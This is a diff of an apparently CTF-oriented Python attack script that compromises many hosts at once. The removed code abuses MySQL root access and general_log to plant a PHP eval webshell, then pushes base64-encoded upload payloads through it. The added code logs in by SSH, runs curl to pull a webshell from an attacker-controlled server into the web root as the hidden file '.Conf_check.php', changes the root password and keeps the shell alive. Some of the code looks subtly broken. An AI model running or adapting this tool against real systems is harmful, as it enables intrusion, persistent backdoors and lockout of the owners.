@@ -2,7 +2,9 @@
 # -*- coding: UTF-8 -*-
 # made by 3s_NwGeek
 # from multiprocessing.dummy import Pool as ThreadPool
-import requests,random,MySQLdb,re,base64
+passwd = 'ts@hack'
+import requests,random,time
+import paramiko,base64
 import time
 from gevent import monkey
 from gevent.pool import Pool
@@ -10,48 +12,34 @@ from bs4 import BeautifulSoup
 from urllib import unquote
 from hashlib import md5
 monkey.patch_all()
-passwd = 'ts@hack'
+#
 
 # 目标主机
 # target = '127.0.0.1:80'
-username="root"#一定要root权限才可以有效写文件
-login_psw="root"
-webshell_path= 'http://TARGET_IP/service.php'#要跟查询路径的文件名相同！！！！！！！！！
-webshell_psw='a111'
-localfile = 'C:\Users\\3s_NwGeek\Desktop\\light.php'  # 本地待上传的文件名
-# print 'set password for root@localhost = password("%s"); '%change_pwd
-#Secure_file_priv <5.5.53可以直接loadfile读flag，然后命令行curl提交
-# #路径要改,log_file = 'C:/phpstudy/WWW/test1.php'一定要跟上面webshell_path保持统一文件名
-webroot='D:/installed_software/phpstudy/WWW'
-cmd='del %s/service.php'%webroot
-sqlquerys=('''select @@version;
-set global general_log = off;
-set global general_log = on;
-set global general_log_file = '%s/service.php';
-select "<?php phpinfo();eval($_POST['a111']);exit();?>";
-set global general_log = off;
-'''%webroot).splitlines()
+download_path='http://192.168.205.121/mixV2.drt'#自己服务器上的webshell地址
+webroot_path='/var/www/html'#上传网站根目录
+RCE_code='curl -o %s %s/.Conf_check.php'%(download_path,webroot_path)#要执行的命令，反向下载马
+#批量目标主机
+targets=open("C:\Users\\3s_NwGeek\Desktop\\target.txt").read().splitlines()#批量目标
+username='root'
+oldpwd='zxzx123123'
+newpwd='SKIWNksunK'
 bakup_webshell_url='''http://TARGET_IP/index.php
 http://TARGET_IP/light.php'''.splitlines()
 
-#批量目标主机
-targets=open("C:\Users\\3s_NwGeek\Desktop\\target.txt").read().splitlines()#批量目标
-localfile_content = open(localfile, 'rb').read()
 def main(target):
-
+    # 上传功能
     while True:
         usual_get(target)
         webshell_url=upupup(target)
         #读取url  php -loadip 、reupload、get ?_、norespond、random get
-        # print webshell_url,'testing!!!!'
-        if not webshell_url:
-            print 'if not webshell_url and continute'
-            continue
-        elif 'http' not in webshell_url:
+        # print webshell_url
+        if 'http' not in webshell_url:
             time.sleep(3)
             # print "主循环一次"
-            print 'elif http not in webshell_url:'
             continue
+
+        #upupup要返回上马地址
 
         tar,res=maintain_webshell(webshell_url,target)
         if len(res)>0:
@@ -64,64 +52,33 @@ def main(target):
 
 def upupup(target):#上传
     try:
-        conn = MySQLdb.connect(host=target, user=username, passwd=login_psw,port=3306,connect_timeout=1)
-        print target,':login scceuss'
+        # print "进入upupup()"
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # 跳过了远程连接中选择‘是’的环节,
+        ssh.connect(hostname=target, port=22, username=username, password=oldpwd, timeout=5)
+        stdin, stdout, stderr = ssh.exec_command(RCE_code+'\n')
         time.sleep(0.5)
-        cursor = conn.cursor()
-        # 使用execute方法执行SQL语句
-        # cursor.execute('set password for root@localhost = password("%s"); '%change_pwd)
-        for sql_q in sqlquerys:
-            cursor.execute(sql_q)
-            time.sleep(0.5)
-            data = cursor.fetchone()
-            if data:
-                print "%s return : %s " % (target, data)
-        # 使用 fetchone() 方法获取一条数据
-        # 关闭数据库连接
-        conn.close()
-        reg = ".*/([^/]*\.php?)"
-        w_path = webshell_path.replace('TARGET_IP', target)
-        print w_path
-        match_shell_name = re.search(reg, w_path)
-        if match_shell_name:
-            shell_name = match_shell_name.group(1)  # 1.php
-            shell_path = ""
-            try:
-                data = {}
-                data[webshell_psw] = '@eval(base64_decode($_POST[z0]));'
-                data['z0'] = 'ZWNobyAnIS1fLSEtXy0hJy4kX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddLichLV8tIS1fLSEnOw=='
-                shell_path = re.findall(re.compile(r'\!-_-\!-_-\!.+\!-_-\!-_-\!'), requests.post(w_path, data).text.strip())[0].replace('!-_-!-_-!', '')
-                # print shell_path
-                target_path = shell_path.split(shell_name)[0].replace('TARGET_IP', target)  + '/.Conf_check.php' # 获取上传绝对路径文件地址
-                # print 'target_path:',target_path
-                target_path_base64 = base64.b64encode(target_path)
-                # print w_path,w_path.split(shell_name)
-                target_file_url = w_path.split(shell_name)[0].replace('TARGET_IP', target) + '/.Conf_check.php'  # 上传url地址
-                # print 'target_file_url:',target_file_url
-                data = {}
-                data[webshell_psw] = '@eval(base64_decode($_POST[z0]));'
-                data[
-                    'z0'] = 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzsKJGY9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pOwokYz1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejIiXSk7CiRidWY9IiI7CmZvcigkaT0wOyRpPHN0cmxlbigkYyk7JGkrPTEpCiAgICAkYnVmLj1zdWJzdHIoJGMsJGksMSk7CmVjaG8oQGZ3cml0ZShmb3BlbigkZiwidyIpLCRidWYpKTsKZWNobygifDwtIik7CmRpZSgpOw=='
-                data['z1'] = target_path_base64
-                data['z2'] = base64.b64encode(localfile_content)
-                # print 'webshell_path:',w_path,data
-                requests.post(w_path , data).text.strip()
-                if 'check_url' in requests.get(target_file_url + "?_").content:
-                    print target,':getshell success!!!!!!!!!!!!!!',excmd(target_file_url, passwd, cmd, encoding='utf-8')
+        stdin, stdout, stderr = ssh.exec_command('passwd\n')
+        time.sleep(0.5)
+        stdin.write(newpwd+'\n')
+        time.sleep(0.5)
+        stdin.write(newpwd+'\n')
+        stdin.flush()
+        target_file_url='http://'+target+'/.Conf_check.php?_'
+        if 'check_url' in requests.get(target_file_url + "?_").content:
+            # print "跳出upupup:check_url"
+            return target_file_url
+        else:
+            return ''
 
-                    return target_file_url.replace('TARGET_IP', target)
-            except Exception as e:
-                if 'list out of range' in str(e):
-                    print target,'日志获取根路径错误：target_path'
-                print e
-                pass
     except Exception as e:
-        print target+' is no vul:','有可能输入格式错误',e
+        return ''
 
 
 
 def maintain_webshell(webshell_url, target, Timeout=5):#检测函数，返回检测目标，检测结果
     # print "进入maintain_webshell()"
+    webshell_url = webshell_url.replace('TARGET_IP', target)
     head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
@@ -129,7 +86,7 @@ def maintain_webshell(webshell_url, target, Timeout=5):#检测函数，返回检
             'Upgrade-Insecure-Requests': '1',
             'Cache-Control': 'max-age=0'}
     try:
-        r=requests.get(webshell_url + '?_', headers=head,timeout=5,proxies={'http': 'http://127.0.0.1:8080'})
+        r=requests.get(webshell_url + '?_', headers=head,timeout=15,proxies={'http': 'http://127.0.0.1:8080'})
         # print r.content
         # html=BeautifulSoup(r.content.decode('gb2312','ignore'),'lxml')#注意根据实际情况编码
         html = BeautifulSoup(r.content, 'lxml', from_encoding="utf8")  # 注意根据实际情况编码
@@ -273,11 +230,10 @@ def excmd(url, passwd, cmd, encoding='utf-8'):
         print(url,'参数配置错误，连接异常err:%s'%str(e))
         # traceback.print_exc()
 
+
 if __name__ == '__main__':
 
     # main(target)
     pool = Pool(len(targets))#批量
     pool.map(main, targets)
-    # print targets
-    # pool = ThreadPool(len(targets))
-    # pool.map(main,targets)#
+  
